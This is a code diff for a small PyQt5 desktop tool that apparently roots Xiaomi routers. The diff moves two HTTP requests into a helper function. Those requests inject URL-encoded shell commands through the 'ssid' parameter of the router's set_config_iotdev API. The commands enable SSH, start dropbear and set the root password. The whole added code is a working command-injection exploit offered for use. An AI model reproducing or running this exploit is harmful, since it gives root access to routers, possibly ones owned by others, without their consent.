@@ -10,6 +10,17 @@ from PyQt5 import QtCore, QtWidgets
 from PyQt5.QtWidgets import QApplication, QDialog, QMessageBox
 
 
+def req(ip, stok, passwd):
+    result1 = requests.get(
+        "http://" + ip + "/cgi-bin/luci/;stok=" + stok + "/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20nvram%20set%20ssh_en%3D1%3B%20nvram%20commit%3B%20sed%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%5C%22debug%5C%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear%3B%20%2Fetc%2Finit.d%2Fdropbear%20start%3B")
+    result2 = requests.get(
+        "http://" + ip + "/cgi-bin/luci/;stok=" + stok + "/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%ds3B%20echo%20-e%20'" + passwd + "%5Cn" + passwd + "'%20%7C%20passwd%20root%3B")
+    if result1.text == '{"code":0}' and result2.text == '{"code":0}':
+        return True
+    else:
+        return False
+
+
 class Ui_Dialog(object):
     def setupUi(self, Dialog):
         Dialog.setObjectName("Dialog")
@@ -62,14 +73,12 @@ class MainDialog(QDialog):
         stok = self.ui.lineEdit_2.text()
         passwd = self.ui.lineEdit_3.text()
         ip = self.ui.lineEdit.text()
-        result1 = requests.get(
-            "http://"+ip+"/cgi-bin/luci/;stok="+stok+"/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20nvram%20set%20ssh_en%3D1%3B%20nvram%20commit%3B%20sed%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%5C%22debug%5C%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear%3B%20%2Fetc%2Finit.d%2Fdropbear%20start%3B")
-        result2 = requests.get(
-            "http://"+ip+"/cgi-bin/luci/;stok="+stok+"/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%ds3B%20echo%20-e%20'"+passwd+"%5Cn"+passwd+"'%20%7C%20passwd%20root%3B")
-        if result1.status_code == 200 and result2.status_code == 200:
+        result = req(ip, stok, passwd)
+        if result:
             QMessageBox.information(self, 'success', 'success')
         else:
-            QMessageBox.warning(self, 'error', 'something went wrong')
+            QMessageBox.information(self, 'error', 'error')
+
 
 if __name__ == '__main__':
     myapp = QApplication(sys.argv)
